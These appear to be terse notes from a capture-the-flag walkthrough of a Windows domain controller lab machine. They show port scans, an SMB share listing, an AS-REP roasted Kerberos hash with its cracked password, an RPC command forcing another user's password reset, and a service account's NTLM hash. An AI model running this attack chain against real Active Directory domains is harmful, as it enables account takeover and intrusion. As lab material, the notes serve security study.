IP = 10.10.10.192

Nmap (nmap -p- -Pn 10.10.10.192)
```bash
PORT     STATE SERVICE
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman
```

Nmap2 (nmap -p 88,135,139,389,593,3268,5985 -sC -sV -Pn 10.10.10.192)
```bash
PORT     STATE    SERVICE      VERSION
88/tcp   open     kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-25 16:59:46Z)
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  filtered netbios-ssn
389/tcp  open     ldap         Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
593/tcp  open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
3268/tcp open     ldap         Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

smb share (smbclient -U "anonymous" -L //10.10.10.192)
```bash
 Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
```

getnpusers.py output:
```
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:b1de71a8df1e3888543b900760e41d47$2d734e604439739d817689fa22bb8de7af2beabcef7fa88ebdbd94dc09e563ad8b29815b772243cfd60c76128a96bc45cb9754b2e42af737edd0873d0de66f4ba0512690b983052adc6e29da2ecf09ad73e0ab8fa6302f4798021d2489c4b4e136392f53a713cf7fee803913b87428fafb0709239b8470f7e2f2f1b63413da179e97a9eb463fece97255baf9986a0bb13bb0a7a657f429a1552590a1d907a0b710752d7c250d185cae024516d8f5d91d75c65fa1ffaa9db38ac883007229709a5c464a97710abee3d636a0da6b51cbf2e13ab68d976772b98a2fdb500edc437faf2635942a06cc8681c52132ec5e62d3a4be6ba4
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

cracked kerberos ticket (with john)
```
#00^BlackKnight
```

reset user audit2020 password
```
setuserinfo2 audit2020 23 Burnbaby1! Burnbaby1!
```

svc_backup hash
```
9658d1d1dcd9250115e2205d9f48400d
```

notes
```
Mates,                                                                                                                                     
                    
After the domain compromise and computer forensic last week, auditors advised us to:                                                       
- change every passwords -- Done.                                                                                                          
- change krbtgt password twice -- Done.                                                                                                    
- disable auditor's account (audit2020) -- KO.                                                                                             
- use nominative domain admin accounts instead of this one -- KO.                                                                          
              
We will probably have to backup & restore things later.                                                                                    
- Mike.                                                                                   
PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt) 
```